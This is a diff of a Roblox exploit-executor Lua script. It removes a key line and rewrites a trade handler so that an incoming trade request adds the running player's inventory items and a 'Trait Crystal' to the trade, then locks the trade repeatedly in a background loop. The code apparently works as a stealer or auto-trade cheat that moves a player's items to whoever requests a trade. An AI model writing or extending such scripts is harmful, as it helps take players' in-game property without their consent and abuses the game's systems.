@@ -1,4 +1,3 @@
-getgenv().Key = "k502401ef1af5c6d7c4180d1"
 getgenv().KeyMaru = "MARU-WSHO-PT9LF-VC0H-VG334-XIJ5"
 print('dbuoi')
 getgenv().hasrunn = true
@@ -626,6 +625,7 @@ else
         local v_u_11 = game.ReplicatedStorage:WaitForChild("TradeRemotes")
         v_u_11.TradeUpdated.OnClientEvent:Connect(function(p27, p28)
             if p27 == "Requesting" then
+                wait(1)
                 for i,v in pairs(dectectinven()) do
                     wait(2)
                     local args = {
@@ -637,6 +637,7 @@ else
                     
                     letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
                 end
+                wait(1)
                 local args = {
                     [1] = "Trait Crystal",
                     [2] = "Items",
@@ -655,17 +656,24 @@ else
                 
                 letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
                 wait(2)
-                local asdasda= tick()
-                repeat wait(10)
+                getgenv().autolock = true
+            end
+        end)
+    end
+
+    spawn(function()
+        while true do wait(10)
+            pcall(function()
+                if getgenv().autolock == true then
                     local args = {
                         [1] = "TRADE_LOCK",
                         [4] = true
                     }
                     letfkinggo(p63.TRADE_UPDATE_CONTENTS, unpack(args))
-                until tick() - asdasda > 200
-            end
-        end)
-    end
+                end
+            end)
+        end
+    end)
 
     while getgenv().hasrunn do wait()
         local a,b = pcall(function()
